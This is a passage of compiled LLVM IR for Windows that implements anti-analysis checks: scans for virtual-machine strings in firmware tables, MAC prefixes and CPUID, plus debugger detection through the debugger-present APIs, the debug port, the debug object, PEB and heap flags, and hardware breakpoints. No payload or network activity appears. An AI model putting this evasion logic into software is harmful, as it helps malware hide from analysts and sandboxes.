10:                                               ; preds = %0
  %11 = load i32, ptr %2, align 4
  %12 = zext i32 %11 to i64
  %13 = call ptr @malloc(i64 noundef %12) #9
  store ptr %13, ptr %3, align 8
  %14 = load ptr, ptr %3, align 8
  %15 = icmp ne ptr %14, null
  br i1 %15, label %17, label %16

16:                                               ; preds = %10
  store i32 0, ptr %1, align 4
  br label %75

17:                                               ; preds = %10
  %18 = load ptr, ptr %3, align 8
  %19 = load i32, ptr %2, align 4
  %20 = call i32 @GetSystemFirmwareTable(i32 noundef 1381190978, i32 noundef 0, ptr noundef %18, i32 noundef %19)
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %24, label %22

22:                                               ; preds = %17
  %23 = load ptr, ptr %3, align 8
  call void @free(ptr noundef %23)
  store i32 0, ptr %1, align 4
  br label %75

24:                                               ; preds = %17
  store i8 0, ptr %4, align 1
  store i32 0, ptr %5, align 4
  br label %25

25:                                               ; preds = %67, %24
  %26 = load i32, ptr %5, align 4
  %27 = load i32, ptr %2, align 4
  %28 = sub i32 %27, 8
  %29 = icmp ult i32 %26, %28
  br i1 %29, label %30, label %70

30:                                               ; preds = %25
  %31 = load ptr, ptr %3, align 8
  %32 = load i32, ptr %5, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds i8, ptr %31, i64 %33
  %35 = call i32 @memcmp(ptr noundef %34, ptr noundef @.str.15, i64 noundef 6)
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %65, label %37

37:                                               ; preds = %30
  %38 = load ptr, ptr %3, align 8
  %39 = load i32, ptr %5, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i8, ptr %38, i64 %40
  %42 = call i32 @memcmp(ptr noundef %41, ptr noundef @.str.1.16, i64 noundef 10)
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %65, label %44

44:                                               ; preds = %37
  %45 = load ptr, ptr %3, align 8
  %46 = load i32, ptr %5, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds i8, ptr %45, i64 %47
  %49 = call i32 @memcmp(ptr noundef %48, ptr noundef @.str.2.17, i64 noundef 4)
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %65, label %51

51:                                               ; preds = %44
  %52 = load ptr, ptr %3, align 8
  %53 = load i32, ptr %5, align 4
  %54 = zext i32 %53 to i64
  %55 = getelementptr inbounds i8, ptr %52, i64 %54
  %56 = call i32 @memcmp(ptr noundef %55, ptr noundef @.str.3.18, i64 noundef 3)
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %65, label %58

58:                                               ; preds = %51
  %59 = load ptr, ptr %3, align 8
  %60 = load i32, ptr %5, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds i8, ptr %59, i64 %61
  %63 = call i32 @memcmp(ptr noundef %62, ptr noundef @.str.4.19, i64 noundef 7)
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

65:                                               ; preds = %58, %51, %44, %37, %30
  store i8 1, ptr %4, align 1
  br label %70

66:                                               ; preds = %58
  br label %67

67:                                               ; preds = %66
  %68 = load i32, ptr %5, align 4
  %69 = add i32 %68, 1
  store i32 %69, ptr %5, align 4
  br label %25, !llvm.loop !12

70:                                               ; preds = %65, %25
  %71 = load ptr, ptr %3, align 8
  call void @free(ptr noundef %71)
  %72 = load i8, ptr %4, align 1
  %73 = trunc i8 %72 to i1
  %74 = zext i1 %73 to i32
  store i32 %74, ptr %1, align 4
  br label %75

75:                                               ; preds = %70, %22, %16, %9
  %76 = load i32, ptr %1, align 4
  ret i32 %76
}

declare dllimport i32 @GetSystemFirmwareTable(i32 noundef, i32 noundef, ptr noundef, i32 noundef) #1

; Function Attrs: allocsize(0)
declare dso_local ptr @malloc(i64 noundef) #3

declare dso_local void @free(ptr noundef) #1

declare dso_local i32 @memcmp(ptr noundef, ptr noundef, i64 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @HasVMMacAddress() #0 {
  %1 = alloca i32, align 4
  %2 = alloca ptr, align 8
  %3 = alloca ptr, align 8
  %4 = alloca i32, align 4
  %5 = alloca ptr, align 8
  %6 = alloca ptr, align 8
  %7 = alloca i32, align 4
  %8 = alloca [18 x i8], align 16
  %9 = call ptr @LoadLibraryA(ptr noundef @.str.5.20)
  store ptr %9, ptr %2, align 8
  %10 = load ptr, ptr %2, align 8
  %11 = call ptr @GetProcAddress(ptr noundef %10, ptr noundef @.str.6.21)
  store ptr %11, ptr %3, align 8
  store i32 0, ptr %4, align 4
  store ptr null, ptr %5, align 8
  store ptr null, ptr %6, align 8
  store i32 0, ptr %7, align 4
  %12 = load ptr, ptr %3, align 8
  %13 = call i32 %12(ptr noundef null, ptr noundef %4)
  %14 = icmp ne i32 %13, 111
  br i1 %14, label %15, label %18

15:                                               ; preds = %0
  %16 = call ptr @__acrt_iob_func(i32 noundef 2)
  %17 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %16, ptr noundef @.str.7.22)
  store i32 0, ptr %1, align 4
  br label %97

18:                                               ; preds = %0
  %19 = load i32, ptr %4, align 4
  %20 = zext i32 %19 to i64
  %21 = call ptr @malloc(i64 noundef %20) #9
  store ptr %21, ptr %5, align 8
  %22 = load ptr, ptr %5, align 8
  %23 = icmp ne ptr %22, null
  br i1 %23, label %27, label %24

24:                                               ; preds = %18
  %25 = call ptr @__acrt_iob_func(i32 noundef 2)
  %26 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %25, ptr noundef @.str.8.23)
  store i32 0, ptr %1, align 4
  br label %97

27:                                               ; preds = %18
  %28 = load ptr, ptr %3, align 8
  %29 = load ptr, ptr %5, align 8
  %30 = call i32 %28(ptr noundef %29, ptr noundef %4)
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %27
  %33 = call ptr @__acrt_iob_func(i32 noundef 2)
  %34 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %33, ptr noundef @.str.9.24)
  %35 = load ptr, ptr %5, align 8
  call void @free(ptr noundef %35)
  store i32 0, ptr %1, align 4
  br label %97

36:                                               ; preds = %27
  %37 = load ptr, ptr %5, align 8
  store ptr %37, ptr %6, align 8
  br label %38

38:                                               ; preds = %90, %36
  %39 = load ptr, ptr %6, align 8
  %40 = icmp ne ptr %39, null
  br i1 %40, label %41, label %94

41:                                               ; preds = %38
  %42 = getelementptr inbounds [18 x i8], ptr %8, i64 0, i64 0
  %43 = load ptr, ptr %6, align 8
  %44 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %43, i32 0, i32 5
  %45 = getelementptr inbounds [8 x i8], ptr %44, i64 0, i64 0
  %46 = load i8, ptr %45, align 8
  %47 = zext i8 %46 to i32
  %48 = load ptr, ptr %6, align 8
  %49 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %48, i32 0, i32 5
  %50 = getelementptr inbounds [8 x i8], ptr %49, i64 0, i64 1
  %51 = load i8, ptr %50, align 1
  %52 = zext i8 %51 to i32
  %53 = load ptr, ptr %6, align 8
  %54 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %53, i32 0, i32 5
  %55 = getelementptr inbounds [8 x i8], ptr %54, i64 0, i64 2
  %56 = load i8, ptr %55, align 2
  %57 = zext i8 %56 to i32
  %58 = load ptr, ptr %6, align 8
  %59 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %58, i32 0, i32 5
  %60 = getelementptr inbounds [8 x i8], ptr %59, i64 0, i64 3
  %61 = load i8, ptr %60, align 1
  %62 = zext i8 %61 to i32
  %63 = load ptr, ptr %6, align 8
  %64 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %63, i32 0, i32 5
  %65 = getelementptr inbounds [8 x i8], ptr %64, i64 0, i64 4
  %66 = load i8, ptr %65, align 4
  %67 = zext i8 %66 to i32
  %68 = load ptr, ptr %6, align 8
  %69 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %68, i32 0, i32 5
  %70 = getelementptr inbounds [8 x i8], ptr %69, i64 0, i64 5
  %71 = load i8, ptr %70, align 1
  %72 = zext i8 %71 to i32
  %73 = call i32 (ptr, ptr, ...) @sprintf(ptr noundef %42, ptr noundef @.str.10.25, i32 noundef %47, i32 noundef %52, i32 noundef %57, i32 noundef %62, i32 noundef %67, i32 noundef %72)
  %74 = getelementptr inbounds [18 x i8], ptr %8, i64 0, i64 0
  %75 = call i32 @strncmp(ptr noundef %74, ptr noundef @.str.11.26, i64 noundef 8)
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %89, label %77

77:                                               ; preds = %41
  %78 = getelementptr inbounds [18 x i8], ptr %8, i64 0, i64 0
  %79 = call i32 @strncmp(ptr noundef %78, ptr noundef @.str.12.27, i64 noundef 8)
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %89, label %81

81:                                               ; preds = %77
  %82 = getelementptr inbounds [18 x i8], ptr %8, i64 0, i64 0
  %83 = call i32 @strncmp(ptr noundef %82, ptr noundef @.str.13.28, i64 noundef 8)
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %89, label %85

85:                                               ; preds = %81
  %86 = getelementptr inbounds [18 x i8], ptr %8, i64 0, i64 0
  %87 = call i32 @strncmp(ptr noundef %86, ptr noundef @.str.14.29, i64 noundef 8)
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %90

89:                                               ; preds = %85, %81, %77, %41
  store i32 1, ptr %7, align 4
  br label %94

90:                                               ; preds = %85
  %91 = load ptr, ptr %6, align 8
  %92 = getelementptr inbounds %struct._IP_ADAPTER_INFO, ptr %91, i32 0, i32 0
  %93 = load ptr, ptr %92, align 8
  store ptr %93, ptr %6, align 8
  br label %38, !llvm.loop !13

94:                                               ; preds = %89, %38
  %95 = load ptr, ptr %5, align 8
  call void @free(ptr noundef %95)
  %96 = load i32, ptr %7, align 4
  store i32 %96, ptr %1, align 4
  br label %97

97:                                               ; preds = %94, %32, %24, %15
  %98 = load i32, ptr %1, align 4
  ret i32 %98
}

declare dllimport ptr @LoadLibraryA(ptr noundef) #1

declare dllimport ptr @GetProcAddress(ptr noundef, ptr noundef) #1

declare dllimport ptr @__acrt_iob_func(i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @fprintf(ptr noundef %0, ptr noundef nonnull %1, ...) #0 {
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca i32, align 4
  %6 = alloca ptr, align 8
  store ptr %0, ptr %3, align 8
  store ptr %1, ptr %4, align 8
  call void @llvm.va_start(ptr %6)
  %7 = load ptr, ptr %3, align 8
  %8 = load ptr, ptr %4, align 8
  %9 = load ptr, ptr %6, align 8
  %10 = call i32 @__mingw_vfprintf(ptr noundef %7, ptr noundef %8, ptr noundef %9) #2
  store i32 %10, ptr %5, align 4
  call void @llvm.va_end(ptr %6)
  %11 = load i32, ptr %5, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @sprintf(ptr noundef %0, ptr noundef nonnull %1, ...) #0 {
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca i32, align 4
  %6 = alloca ptr, align 8
  store ptr %0, ptr %3, align 8
  store ptr %1, ptr %4, align 8
  call void @llvm.va_start(ptr %6)
  %7 = load ptr, ptr %3, align 8
  %8 = load ptr, ptr %4, align 8
  %9 = load ptr, ptr %6, align 8
  %10 = call i32 @__mingw_vsprintf(ptr noundef %7, ptr noundef %8, ptr noundef %9) #2
  store i32 %10, ptr %5, align 4
  call void @llvm.va_end(ptr %6)
  %11 = load i32, ptr %5, align 4
  ret i32 %11
}

declare dso_local i32 @strncmp(ptr noundef, ptr noundef, i64 noundef) #1

; Function Attrs: nocallback nofree nosync nounwind willreturn
declare void @llvm.va_start(ptr) #4

; Function Attrs: nounwind
declare dso_local i32 @__mingw_vsprintf(ptr noundef, ptr noundef, ptr noundef) #5

; Function Attrs: nocallback nofree nosync nounwind willreturn
declare void @llvm.va_end(ptr) #4

; Function Attrs: nounwind
declare dso_local i32 @__mingw_vfprintf(ptr noundef, ptr noundef, ptr noundef) #5

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @antiVirtualizationCheck() #0 {
  %1 = alloca ptr, align 8
  %2 = alloca i32, align 4
  %3 = alloca ptr, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [4 x i32], align 16
  %8 = alloca [13 x i8], align 1
  store i32 0, ptr %6, align 4
  call void @llvm.memset.p0.i64(ptr align 16 %7, i8 0, i64 16, i1 false)
  %9 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 0
  store ptr %9, ptr %1, align 8
  store i32 1, ptr %2, align 4
  %10 = load ptr, ptr %1, align 8
  %11 = load ptr, ptr %1, align 8
  %12 = getelementptr inbounds i32, ptr %11, i64 1
  %13 = load ptr, ptr %1, align 8
  %14 = getelementptr inbounds i32, ptr %13, i64 2
  %15 = load ptr, ptr %1, align 8
  %16 = getelementptr inbounds i32, ptr %15, i64 3
  %17 = load i32, ptr %2, align 4
  %18 = call { i32, i32, i32, i32 } asm sideeffect "cpuid", "={ax},={bx},={cx},={dx},{ax},~{dirflag},~{fpsr},~{flags}"(i32 %17) #2, !srcloc !14
  %19 = extractvalue { i32, i32, i32, i32 } %18, 0
  %20 = extractvalue { i32, i32, i32, i32 } %18, 1
  %21 = extractvalue { i32, i32, i32, i32 } %18, 2
  %22 = extractvalue { i32, i32, i32, i32 } %18, 3
  store i32 %19, ptr %10, align 4
  store i32 %20, ptr %12, align 4
  store i32 %21, ptr %14, align 4
  store i32 %22, ptr %16, align 4
  %23 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 2
  %24 = load i32, ptr %23, align 8
  %25 = and i32 %24, -2147483648
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %72

27:                                               ; preds = %0
  %28 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 0
  store ptr %28, ptr %3, align 8
  store i32 1073741824, ptr %4, align 4
  %29 = load ptr, ptr %3, align 8
  %30 = load ptr, ptr %3, align 8
  %31 = getelementptr inbounds i32, ptr %30, i64 1
  %32 = load ptr, ptr %3, align 8
  %33 = getelementptr inbounds i32, ptr %32, i64 2
  %34 = load ptr, ptr %3, align 8
  %35 = getelementptr inbounds i32, ptr %34, i64 3
  %36 = load i32, ptr %4, align 4
  %37 = call { i32, i32, i32, i32 } asm sideeffect "cpuid", "={ax},={bx},={cx},={dx},{ax},~{dirflag},~{fpsr},~{flags}"(i32 %36) #2, !srcloc !14
  %38 = extractvalue { i32, i32, i32, i32 } %37, 0
  %39 = extractvalue { i32, i32, i32, i32 } %37, 1
  %40 = extractvalue { i32, i32, i32, i32 } %37, 2
  %41 = extractvalue { i32, i32, i32, i32 } %37, 3
  store i32 %38, ptr %29, align 4
  store i32 %39, ptr %31, align 4
  store i32 %40, ptr %33, align 4
  store i32 %41, ptr %35, align 4
  call void @llvm.memset.p0.i64(ptr align 1 %8, i8 0, i64 13, i1 false)
  %42 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %43 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 1
  call void @llvm.memcpy.p0.p0.i64(ptr align 1 %42, ptr align 4 %43, i64 4, i1 false)
  %44 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %45 = getelementptr inbounds i8, ptr %44, i64 4
  %46 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 2
  call void @llvm.memcpy.p0.p0.i64(ptr align 1 %45, ptr align 8 %46, i64 4, i1 false)
  %47 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %48 = getelementptr inbounds i8, ptr %47, i64 8
  %49 = getelementptr inbounds [4 x i32], ptr %7, i64 0, i64 3
  call void @llvm.memcpy.p0.p0.i64(ptr align 1 %48, ptr align 4 %49, i64 4, i1 false)
  %50 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %51 = call ptr @strstr(ptr noundef %50, ptr noundef @.str.15)
  %52 = icmp ne ptr %51, null
  br i1 %52, label %65, label %53

53:                                               ; preds = %27
  %54 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %55 = call ptr @strstr(ptr noundef %54, ptr noundef @.str.15.30)
  %56 = icmp ne ptr %55, null
  br i1 %56, label %65, label %57

57:                                               ; preds = %53
  %58 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %59 = call ptr @strstr(ptr noundef %58, ptr noundef @.str.3.18)
  %60 = icmp ne ptr %59, null
  br i1 %60, label %65, label %61

61:                                               ; preds = %57
  %62 = getelementptr inbounds [13 x i8], ptr %8, i64 0, i64 0
  %63 = call ptr @strstr(ptr noundef %62, ptr noundef @.str.16)
  %64 = icmp ne ptr %63, null
  br label %65

65:                                               ; preds = %61, %57, %53, %27
  %66 = phi i1 [ true, %57 ], [ true, %53 ], [ true, %27 ], [ %64, %61 ]
  %67 = zext i1 %66 to i32
  store i32 %67, ptr %6, align 4
  %68 = load i32, ptr %6, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %71

70:                                               ; preds = %65
  store i32 1, ptr %5, align 4
  br label %73

71:                                               ; preds = %65
  store i32 0, ptr %5, align 4
  br label %73

72:                                               ; preds = %0
  store i32 0, ptr %5, align 4
  br label %73

73:                                               ; preds = %72, %71, %70
  %74 = load i32, ptr %5, align 4
  ret i32 %74
}

; Function Attrs: nocallback nofree nounwind willreturn memory(argmem: write)
declare void @llvm.memset.p0.i64(ptr nocapture writeonly, i8, i64, i1 immarg) #6

; Function Attrs: nocallback nofree nounwind willreturn memory(argmem: readwrite)
declare void @llvm.memcpy.p0.p0.i64(ptr noalias nocapture writeonly, ptr noalias nocapture readonly, i64, i1 immarg) #7

declare dso_local ptr @strstr(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @debuggerCheckAPI() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, ptr %2, align 4
  %3 = call i32 @IsDebuggerPresent()
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %5, label %6

5:                                                ; preds = %0
  store i32 1, ptr %1, align 4
  br label %15

6:                                                ; preds = %0
  %7 = call ptr @GetCurrentProcess()
  %8 = call i32 @CheckRemoteDebuggerPresent(ptr noundef %7, ptr noundef %2)
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %14

10:                                               ; preds = %6
  %11 = load i32, ptr %2, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %10
  store i32 1, ptr %1, align 4
  br label %15

14:                                               ; preds = %10, %6
  store i32 0, ptr %1, align 4
  br label %15

15:                                               ; preds = %14, %13, %5
  %16 = load i32, ptr %1, align 4
  ret i32 %16
}

declare dllimport i32 @IsDebuggerPresent() #1

declare dllimport ptr @GetCurrentProcess() #1

declare dllimport i32 @CheckRemoteDebuggerPresent(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @checkDebugPort() #0 {
  %1 = alloca i32, align 4
  %2 = alloca ptr, align 8
  %3 = alloca ptr, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = call ptr @LoadLibraryA(ptr noundef @.str.31)
  store ptr %6, ptr %2, align 8
  %7 = load ptr, ptr %2, align 8
  %8 = call ptr @GetProcAddress(ptr noundef %7, ptr noundef @.str.1.32)
  store ptr %8, ptr %3, align 8
  store i64 0, ptr %4, align 8
  %9 = load ptr, ptr %3, align 8
  %10 = call ptr @GetCurrentProcess()
  %11 = call i32 %9(ptr noundef %10, i32 noundef 7, ptr noundef %4, i32 noundef 8, ptr noundef null)
  store i32 %11, ptr %5, align 4
  %12 = load i32, ptr %5, align 4
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %19

14:                                               ; preds = %0
  %15 = load i64, ptr %4, align 8
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %14
  %18 = call i32 (ptr, ...) @printf(ptr noundef @.str.2.33)
  store i32 1, ptr %1, align 4
  br label %20

19:                                               ; preds = %14, %0
  store i32 0, ptr %1, align 4
  br label %20

20:                                               ; preds = %19, %17
  %21 = load i32, ptr %1, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @printf(ptr noundef nonnull %0, ...) #0 {
  %2 = alloca ptr, align 8
  %3 = alloca i32, align 4
  %4 = alloca ptr, align 8
  store ptr %0, ptr %2, align 8
  call void @llvm.va_start(ptr %4)
  %5 = call ptr @__acrt_iob_func(i32 noundef 1)
  %6 = load ptr, ptr %2, align 8
  %7 = load ptr, ptr %4, align 8
  %8 = call i32 @__mingw_vfprintf(ptr noundef %5, ptr noundef %6, ptr noundef %7) #2
  store i32 %8, ptr %3, align 4
  call void @llvm.va_end(ptr %4)
  %9 = load i32, ptr %3, align 4
  ret i32 %9
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @checkDebugObjectHandle() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca ptr, align 8
  %4 = alloca i32, align 4
  %5 = alloca ptr, align 8
  store ptr null, ptr %3, align 8
  store i32 0, ptr %4, align 4
  %6 = call ptr @GetModuleHandleA(ptr noundef @.str.31)
  %7 = call ptr @GetProcAddress(ptr noundef %6, ptr noundef @.str.1.32)
  store ptr %7, ptr %5, align 8
  %8 = load ptr, ptr %5, align 8
  %9 = icmp ne ptr %8, null
  br i1 %9, label %11, label %10

10:                                               ; preds = %0
  store i32 0, ptr %1, align 4
  br label %23

11:                                               ; preds = %0
  %12 = load ptr, ptr %5, align 8
  %13 = call ptr @GetCurrentProcess()
  %14 = call i32 %12(ptr noundef %13, i32 noundef 30, ptr noundef %3, i32 noundef 8, ptr noundef %4)
  store i32 %14, ptr %2, align 4
  %15 = load i32, ptr %2, align 4
  %16 = icmp eq i32 %15, 0
  br i1 %16, label %17, label %20

17:                                               ; preds = %11
  %18 = load ptr, ptr %3, align 8
  %19 = icmp ne ptr %18, null
  br label %20

20:                                               ; preds = %17, %11
  %21 = phi i1 [ false, %11 ], [ %19, %17 ]
  %22 = zext i1 %21 to i32
  store i32 %22, ptr %1, align 4
  br label %23

23:                                               ; preds = %20, %10
  %24 = load i32, ptr %1, align 4
  ret i32 %24
}

declare dllimport ptr @GetModuleHandleA(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @PEBFlagsCheck() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8, align 1
  %5 = alloca i32, align 4
  %6 = alloca ptr, align 8
  store i8 0, ptr %4, align 1
  store i32 0, ptr %5, align 4
  store i32 96, ptr %1, align 4
  %7 = load i32, ptr %1, align 4
  %8 = zext i32 %7 to i64
  %9 = inttoptr i64 %8 to ptr
  %10 = call i64 asm "mov$(q %gs:$1, $0 $| $0, %gs:$1$)", "=r,*m,~{dirflag},~{fpsr},~{flags}"(ptr elementtype(i64) %9) #10, !srcloc !15
  store i64 %10, ptr %2, align 8
  %11 = load i64, ptr %2, align 8
  %12 = inttoptr i64 %11 to ptr
  store ptr %12, ptr %6, align 8
  %13 = load ptr, ptr %6, align 8
  %14 = getelementptr inbounds i8, ptr %13, i64 2
  %15 = load i8, ptr %14, align 1
  store i8 %15, ptr %4, align 1
  %16 = load ptr, ptr %6, align 8
  %17 = getelementptr inbounds i8, ptr %16, i64 188
  %18 = load i32, ptr %17, align 4
  store i32 %18, ptr %5, align 4
  %19 = load i8, ptr %4, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %22

21:                                               ; preds = %0
  store i32 1, ptr %3, align 4
  br label %28

22:                                               ; preds = %0
  %23 = load i32, ptr %5, align 4
  %24 = and i32 %23, 112
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %22
  store i32 1, ptr %3, align 4
  br label %28

27:                                               ; preds = %22
  store i32 0, ptr %3, align 4
  br label %28

28:                                               ; preds = %27, %26, %21
  %29 = load i32, ptr %3, align 4
  ret i32 %29
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @heapFlagsCheck() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca ptr, align 8
  %5 = alloca ptr, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 96, ptr %1, align 4
  %12 = load i32, ptr %1, align 4
  %13 = zext i32 %12 to i64
  %14 = inttoptr i64 %13 to ptr
  %15 = call i64 asm "mov$(q %gs:$1, $0 $| $0, %gs:$1$)", "=r,*m,~{dirflag},~{fpsr},~{flags}"(ptr elementtype(i64) %14) #10, !srcloc !15
  store i64 %15, ptr %2, align 8
  %16 = load i64, ptr %2, align 8
  %17 = inttoptr i64 %16 to ptr
  store ptr %17, ptr %4, align 8
  %18 = load ptr, ptr %4, align 8
  %19 = getelementptr inbounds i8, ptr %18, i64 48
  %20 = load ptr, ptr %19, align 8
  store ptr %20, ptr %5, align 8
  %21 = load ptr, ptr %4, align 8
  %22 = getelementptr inbounds i8, ptr %21, i64 280
  %23 = load i32, ptr %22, align 4
  store i32 %23, ptr %8, align 4
  %24 = load i32, ptr %8, align 4
  %25 = icmp uge i32 %24, 6
  %26 = zext i1 %25 to i32
  store i32 %26, ptr %9, align 4
  %27 = load i32, ptr %9, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %0
  store i32 112, ptr %6, align 4
  store i32 116, ptr %7, align 4
  br label %31

30:                                               ; preds = %0
  store i32 20, ptr %6, align 4
  store i32 24, ptr %7, align 4
  br label %31

31:                                               ; preds = %30, %29
  %32 = load ptr, ptr %5, align 8
  %33 = load i32, ptr %6, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i8, ptr %32, i64 %34
  %36 = load i32, ptr %35, align 4
  store i32 %36, ptr %10, align 4
  %37 = load ptr, ptr %5, align 8
  %38 = load i32, ptr %7, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds i8, ptr %37, i64 %39
  %41 = load i32, ptr %40, align 4
  store i32 %41, ptr %11, align 4
  %42 = load i32, ptr %10, align 4
  %43 = and i32 %42, -3
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %48, label %45

45:                                               ; preds = %31
  %46 = load i32, ptr %11, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %49

48:                                               ; preds = %45, %31
  store i32 1, ptr %3, align 4
  br label %50

49:                                               ; preds = %45
  store i32 0, ptr %3, align 4
  br label %50

50:                                               ; preds = %49, %48
  %51 = load i32, ptr %3, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @hardwareBreakpoints() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct._CONTEXT, align 16
  call void @llvm.memset.p0.i64(ptr align 16 %2, i8 0, i64 1232, i1 false)
  %3 = getelementptr inbounds %struct._CONTEXT, ptr %2, i32 0, i32 6
  store i32 1048592, ptr %3, align 16
  %4 = call ptr @GetCurrentThread()
  %5 = call i32 @GetThreadContext(ptr noundef %4, ptr noundef %2)
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %8, label %7

7:                                                ; preds = %0
  store i32 0, ptr %1, align 4
  br label %27

8:                                                ; preds = %0
  %9 = getelementptr inbounds %struct._CONTEXT, ptr %2, i32 0, i32 15
  %10 = load i64, ptr %9, align 8
  %11 = icmp ne i64 %10, 0
  br i1 %11, label %24, label %12

12:                                               ; preds = %8
  %13 = getelementptr inbounds %struct._CONTEXT, ptr %2, i32 0, i32 16
  %14 = load i64, ptr %13, align 16
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %24, label %16

16:                                               ; preds = %12
  %17 = getelementptr inbounds %struct._CONTEXT, ptr %2, i32 0, i32 17
  %18 = load i64, ptr %17, align 8
  %19 = icmp ne i64 %18, 0
  br i1 %19, label %24, label %20

20:                                               ; preds = %16
  %21 = getelementptr inbounds %struct._CONTEXT, ptr %2, i32 0, i32 18
  %22 = load i64, ptr %21, align 16
  %23 = icmp ne i64 %22, 0
  br label %24

24:                                               ; preds = %20, %16, %12, %8
  %25 = phi i1 [ true, %16 ], [ true, %12 ], [ true, %8 ], [ %23, %20 ]
  %26 = zext i1 %25 to i32
  store i32 %26, ptr %1, align 4
  br label %27

27:                                               ; preds = %24, %7
  %28 = load i32, ptr %1, align 4
  ret i32 %28
}

declare dllimport ptr @GetCurrentThread() #1

declare dllimport i32 @GetThreadContext(ptr noundef, ptr noundef) #1

attributes #0 = { noinline nounwind optnone uwtable "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind }
attributes #3 = { allocsize(0) "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nocallback nofree nosync nounwind willreturn }
